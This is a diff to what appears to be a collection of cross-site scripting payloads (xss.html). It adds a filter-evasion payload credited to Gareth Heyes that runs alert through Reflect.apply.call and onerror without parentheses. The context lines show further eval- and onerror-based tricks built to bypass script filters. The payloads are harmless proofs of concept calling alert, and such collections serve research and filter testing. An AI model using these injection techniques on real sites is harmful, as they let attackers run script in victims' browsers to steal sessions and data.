@@ -75,6 +75,12 @@ xss.html
     'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
 
 ---
+
+[Garethheyes](https://x.com/garethheyes/status/1712433333743894919)
+
+    Reflect .apply. call`${reportError}${window}${onerror=alert,[23]}`
+
+---
 Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
 
     onerror=eval;throw'=alert\x2823\x29';
